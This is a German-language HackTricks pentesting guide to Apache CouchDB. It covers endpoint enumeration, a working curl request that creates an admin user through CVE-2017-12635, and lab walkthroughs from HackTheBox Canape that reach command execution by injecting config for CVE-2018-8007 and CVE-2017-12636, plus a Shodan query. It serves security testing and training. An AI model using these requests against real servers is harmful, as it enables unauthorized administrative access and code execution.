# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Grundinformationen**

**CouchDB** ist eine vielseitige und leistungsstarke **dokumentenorientierte Datenbank**, die Daten mithilfe einer **Schl√ºssel-Wert-Karten**-Struktur innerhalb jedes **Dokuments** organisiert. Felder innerhalb des Dokuments k√∂nnen als **Schl√ºssel/Wert-Paare, Listen oder Karten** dargestellt werden, was Flexibilit√§t bei der Datenspeicherung und -abfrage bietet.

Jedes **Dokument**, das in CouchDB gespeichert ist, erh√§lt eine **eindeutige Kennung** (`_id`) auf Dokumentenebene. Dar√ºber hinaus wird jeder vorgenommenen und in der Datenbank gespeicherten √Ñnderung eine **Versionsnummer** (`_rev`) zugewiesen. Diese Versionsnummer erm√∂glicht eine effiziente **Verfolgung und Verwaltung von √Ñnderungen** und erleichtert die einfache Abfrage und Synchronisierung von Daten innerhalb der Datenbank.

**Standardport:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Automatische Aufz√§hlung**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## Manuelle Enumeration

### Banner
```
curl http://IP:5984/
```
Dies sendet eine GET-Anfrage an die installierte CouchDB-Instanz. Die Antwort sollte ungef√§hr wie eine der folgenden aussehen:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Beachten Sie, dass Sie, wenn Sie auf die Wurzel von CouchDB zugreifen und eine `401 Unauthorized`-Antwort mit etwas wie `{"error":"unauthorized","reason":"Authentication required."}` erhalten, **nicht auf** das Banner oder einen anderen Endpunkt zugreifen k√∂nnen.
{% endhint %}

### Info Enumeration

Dies sind die Endpunkte, auf die Sie mit einer **GET**-Anfrage zugreifen und einige interessante Informationen extrahieren k√∂nnen. Sie finden [**weitere Endpunkte und detailliertere Beschreibungen in der CouchDB-Dokumentation**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Liste der laufenden Aufgaben, einschlie√ülich des Aufgabentyps, Namens, Status und Prozess-ID.
* **`/_all_dbs`** Gibt eine Liste aller Datenbanken in der CouchDB-Instanz zur√ºck.
* **`/_cluster_setup`** Gibt den Status des Knotens oder Clusters gem√§√ü dem Cluster-Setup-Assistenten zur√ºck.
* **`/_db_updates`** Gibt eine Liste aller Datenbankereignisse in der CouchDB-Instanz zur√ºck. Die Existenz der `_global_changes`-Datenbank ist erforderlich, um diesen Endpunkt zu verwenden.
* **`/_membership`** Zeigt die Knoten an, die Teil des Clusters sind, als `cluster_nodes`. Das Feld `all_nodes` zeigt alle Knoten an, die dieser Knoten kennt, einschlie√ülich derjenigen, die Teil des Clusters sind.
* **`/_scheduler/jobs`** Liste der Replikationsjobs. Jede Jobbeschreibung enth√§lt Quell- und Zielinformationen, Replikations-ID, eine Historie der letzten Ereignisse und einige andere Dinge.
* **`/_scheduler/docs`** Liste der Replikationsdokumentzust√§nde. Enth√§lt Informationen √ºber alle Dokumente, auch in `completed` und `failed` Zust√§nden. F√ºr jedes Dokument werden die Dokument-ID, die Datenbank, die Replikations-ID, Quelle und Ziel sowie andere Informationen zur√ºckgegeben.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** Der `/_node/{node-name}`-Endpunkt kann verwendet werden, um den Erlang-Knotennamen des Servers zu best√§tigen, der die Anfrage verarbeitet. Dies ist am n√ºtzlichsten, wenn Sie auf `/_node/_local` zugreifen, um diese Informationen abzurufen.
* **`/_node/{node-name}/_stats`** Die `_stats`-Ressource gibt ein JSON-Objekt zur√ºck, das die Statistiken f√ºr den laufenden Server enth√§lt. Der Literalstring `_local` dient als Alias f√ºr den lokalen Knotennamen, sodass f√ºr alle Statistiken-URLs `{node-name}` durch `_local` ersetzt werden kann, um mit den Statistiken des lokalen Knotens zu interagieren.
* **`/_node/{node-name}/_system`** Die \_systemressource gibt ein JSON-Objekt zur√ºck, das verschiedene systemweite Statistiken f√ºr den laufenden Server enth√§lt. Sie k√∂nnen \_\_`_local` als {node-name} verwenden, um aktuelle Knoteninformationen zu erhalten.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Best√§tigt, dass der Server aktiv, betriebsbereit und bereit ist, auf Anfragen zu antworten. Wenn [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) `true` oder `nolb` ist, gibt der Endpunkt eine 404-Antwort zur√ºck.
* **`/_uuids`** Fordert eine oder mehrere Universally Unique Identifiers (UUIDs) von der CouchDB-Instanz an.
* **`/_reshard`** Gibt eine Anzahl von abgeschlossenen, fehlgeschlagenen, laufenden, gestoppten und insgesamt Jobs zusammen mit dem Status des Reshardings im Cluster zur√ºck.

Weitere interessante Informationen k√∂nnen wie hier erkl√§rt extrahiert werden: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Datenbankliste**
```
curl -X GET http://IP:5984/_all_dbs
```
Wenn diese Anfrage **mit einem 401 nicht autorisiert** antwortet, ben√∂tigen Sie **g√ºltige Anmeldeinformationen**, um auf die Datenbank zuzugreifen:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Um g√ºltige Anmeldeinformationen zu finden, k√∂nnten Sie **versuchen**, [**den Dienst zu bruteforcen**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Dies ist ein **Beispiel** f√ºr eine CouchDB **Antwort**, wenn Sie **genug Berechtigungen** haben, um Datenbanken aufzulisten (Es ist nur eine Liste von DBs):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Datenbankinfo

Sie k√∂nnen einige Datenbankinformationen (wie die Anzahl der Dateien und deren Gr√∂√üen) abrufen, indem Sie auf den Datenbanknamen zugreifen:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Dokumentenliste**

Listet jeden Eintrag in einer Datenbank auf
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Dokument lesen**

Lesen Sie den Inhalt eines Dokuments in einer Datenbank:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Privilegieneskalation [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Dank der Unterschiede zwischen Erlang- und JavaScript-JSON-Parsern k√∂nnten Sie **einen Admin-Benutzer** mit den Anmeldeinformationen `hacktricks:hacktricks` mit der folgenden Anfrage erstellen:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Weitere Informationen zu dieser Schwachstelle hier**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Erlang Cookie Sicherheits√ºbersicht**

Beispiel [von hier](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

In der CouchDB-Dokumentation, insbesondere im Abschnitt √ºber die Cluster-Einrichtung ([link](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), wird die Verwendung von Ports durch CouchDB im Cluster-Modus besprochen. Es wird erw√§hnt, dass, wie im Standalone-Modus, der Port `5984` verwendet wird. Zus√§tzlich ist der Port `5986` f√ºr node-lokale APIs vorgesehen, und wichtig ist, dass Erlang den TCP-Port `4369` f√ºr den Erlang Port Mapper Daemon (EPMD) ben√∂tigt, um die Kommunikation zwischen den Knoten innerhalb eines Erlang-Clusters zu erleichtern. Dieses Setup bildet ein Netzwerk, in dem jeder Knoten mit jedem anderen Knoten verbunden ist.

Ein wichtiger Sicherheitshinweis wird bez√ºglich des Ports `4369` hervorgehoben. Wenn dieser Port √ºber das Internet oder ein untrusted Netzwerk zug√§nglich gemacht wird, h√§ngt die Sicherheit des Systems stark von einem einzigartigen Identifikator ab, der als "Cookie" bekannt ist. Dieses Cookie fungiert als Schutzma√ünahme. Zum Beispiel k√∂nnte in einer gegebenen Prozessliste das Cookie mit dem Namen "monster" beobachtet werden, was auf seine operative Rolle im Sicherheitsrahmen des Systems hinweist.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
F√ºr diejenigen, die verstehen m√∂chten, wie dieses "Cookie" f√ºr Remote Code Execution (RCE) im Kontext von Erlang-Systemen ausgenutzt werden kann, steht ein spezieller Abschnitt f√ºr weiterf√ºhrende Lekt√ºre zur Verf√ºgung. Er beschreibt die Methoden zur unbefugten Nutzung von Erlang-Cookies, um Kontrolle √ºber Systeme zu erlangen. Sie k√∂nnen **[den detaillierten Leitfaden zum Missbrauch von Erlang-Cookies f√ºr RCE hier erkunden](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **Ausnutzung von CVE-2018-8007 durch Modifikation von local.ini**

Beispiel [von hier](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Eine k√ºrzlich offengelegte Schwachstelle, CVE-2018-8007, die Apache CouchDB betrifft, wurde untersucht und zeigte, dass die Ausnutzung Schreibberechtigungen f√ºr die Datei `local.ini` erfordert. Obwohl dies aufgrund von Sicherheitsbeschr√§nkungen nicht direkt auf das urspr√ºngliche Zielsystem anwendbar ist, wurden √Ñnderungen vorgenommen, um Schreibzugriff auf die Datei `local.ini` zu gew√§hren, um Erkundungszwecke zu erm√∂glichen. Detaillierte Schritte und Codebeispiele sind unten aufgef√ºhrt, die den Prozess demonstrieren.

Zuerst wird die Umgebung vorbereitet, indem sichergestellt wird, dass die Datei `local.ini` beschreibbar ist, was durch Auflisten der Berechtigungen √ºberpr√ºft wird:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Um die Schwachstelle auszunutzen, wird ein curl-Befehl ausgef√ºhrt, der die `cors/origins`-Konfiguration in `local.ini` anvisiert. Dies injiziert einen neuen Ursprung zusammen mit zus√§tzlichen Befehlen im Abschnitt `[os_daemons]`, um beliebigen Code auszuf√ºhren:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
Nachfolgende √úberpr√ºfungen zeigen die injizierte Konfiguration in `local.ini`, indem sie mit einem Backup verglichen wird, um die √Ñnderungen hervorzuheben:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Urspr√ºnglich existiert die erwartete Datei (`/tmp/0xdf`) nicht, was darauf hindeutet, dass der injizierte Befehl noch nicht ausgef√ºhrt wurde. Weitere Untersuchungen zeigen, dass Prozesse im Zusammenhang mit CouchDB laufen, einschlie√ülich eines, der m√∂glicherweise den injizierten Befehl ausf√ºhren k√∂nnte:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
Durch das Beenden des identifizierten CouchDB-Prozesses und das Zulassen, dass das System ihn automatisch neu startet, wird die Ausf√ºhrung des injizierten Befehls ausgel√∂st, was durch die Existenz der zuvor fehlenden Datei best√§tigt wird:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Diese Erkundung best√§tigt die Durchf√ºhrbarkeit der Ausnutzung von CVE-2018-8007 unter bestimmten Bedingungen, insbesondere der Anforderung nach schreibbarem Zugriff auf die `local.ini`-Datei. Die bereitgestellten Codebeispiele und Verfahrensschritte bieten eine klare Anleitung zur Replikation des Exploits in einer kontrollierten Umgebung.

F√ºr weitere Details zu CVE-2018-8007 siehe die Mitteilung von mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **Erforschen von CVE-2017-12636 mit Schreibberechtigungen auf local.ini**

Beispiel [von hier](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Eine Schwachstelle, bekannt als CVE-2017-12636, wurde untersucht, die die Codeausf√ºhrung √ºber den CouchDB-Prozess erm√∂glicht, obwohl spezifische Konfigurationen deren Ausnutzung verhindern k√∂nnen. Trotz zahlreicher Proof of Concept (POC)-Referenzen, die online verf√ºgbar sind, sind Anpassungen erforderlich, um die Schwachstelle in der CouchDB-Version 2 auszunutzen, die sich von der h√§ufig angegriffenen Version 1.x unterscheidet. Die ersten Schritte bestehen darin, die CouchDB-Version zu √ºberpr√ºfen und das Fehlen des erwarteten Abfrage-Server-Pfades zu best√§tigen:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
Um CouchDB Version 2.0 zu unterst√ºtzen, wird ein neuer Pfad verwendet:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Versuche, einen neuen Abfrage-Server hinzuzuf√ºgen und zu aktivieren, stie√üen auf berechtigungsbezogene Fehler, wie aus der folgenden Ausgabe hervorgeht:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Weitere Untersuchungen ergaben Berechtigungsprobleme mit der `local.ini`-Datei, die nicht beschreibbar war. Durch die √Ñnderung der Dateiberechtigungen mit Root- oder Homer-Zugriff wurde es m√∂glich, fortzufahren:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Nachfolgende Versuche, den Abfrageserver hinzuzuf√ºgen, waren erfolgreich, wie die fehlenden Fehlermeldungen in der Antwort zeigen. Die erfolgreiche Modifikation der `local.ini`-Datei wurde durch einen Dateivergleich best√§tigt:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Der Prozess setzte sich mit der Erstellung einer Datenbank und eines Dokuments fort, gefolgt von einem Versuch, Code √ºber eine benutzerdefinierte Ansicht, die auf den neu hinzugef√ºgten Abfrageserver abgebildet ist, auszuf√ºhren:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[Zusammenfassung](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** mit einer alternativen Payload bietet weitere Einblicke in die Ausnutzung von CVE-2017-12636 unter bestimmten Bedingungen. **N√ºtzliche Ressourcen** zur Ausnutzung dieser Schwachstelle sind:

- [POC Exploit-Code](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Eintrag in der Exploit-Datenbank](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## Referenzen

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
